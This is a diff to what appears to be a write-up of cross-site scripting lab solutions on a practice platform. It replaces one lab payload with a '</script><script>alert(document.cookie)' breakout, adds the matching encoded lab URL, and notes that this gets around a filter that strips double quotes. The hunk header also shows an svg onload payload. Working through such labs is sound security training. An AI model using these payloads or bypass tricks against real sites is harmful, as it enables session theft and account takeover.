@@ -63,13 +63,13 @@ https://fygkuqjd.xssy.uk/target.ftl?name=fck%3Csvg%20onload=alert(document.cooki
 - **URL Lab**: https://xssy.uk/lab/10
 - **Payload**: 
 ```javascript
-";alert(document.cookie);//
+</script><script>alert(document.cookie);//
 ```
 - **Full URL**: 
 ```
-https://66ohqg4u.xssy.uk/target.ftl?name=%22;alert(document.cookie);//
+https://q2je5dje.hacky.uk/target.ftl?name=%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3B%2F%2F
 ```
-
+Character " was stripped, so we can't escape inside js. So I escape with </script> to create new tag script
 ---
 
 ### Lab 2: Attribute XSS
